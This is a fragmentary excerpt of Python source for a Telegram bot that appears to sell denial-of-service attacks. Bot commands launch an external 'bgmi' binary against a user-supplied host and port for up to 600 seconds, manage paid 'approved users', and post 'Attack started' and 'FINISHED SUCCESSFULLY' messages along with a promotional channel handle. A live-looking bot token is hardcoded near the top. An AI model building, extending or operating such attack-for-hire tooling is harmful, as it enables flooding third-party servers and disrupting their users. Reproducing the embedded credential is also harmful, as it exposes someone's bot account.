...
TOKEN = '7538738347:AAGBBcHOR_SUAGb-sq4XRVGKsrDj0MpG7Tg'
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./bgmi {target_ip} {target_port} {min(int(duration), 600)}"  # Limit duration to 600 seconds
    try:
        ...
        # Send a message when the attack finishes
        bot.send_message(CHANNEL_ID, f"Attack on {target_ip}:{target_port} FINISHED SUCCESSFULLY. Duration: {min(int(duration), 600)} seconds.")
...
def list_approved_users(message):
    ...
    users = load_users()
    approved_users = [user_id for user_id, user_data in users.items() if user_data['plan'] > 0]

    if approved_users:
        msg_text = "*Approved Users IDs:*\n" + "\n".join(str(user_id) for user_id in approved_users)
    else:
        msg_text = "*No approved users found.*"
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*\n\nJOIN : @CREATIVEYDV 💟", parse_mode='Markdown')
    except Exception as e:
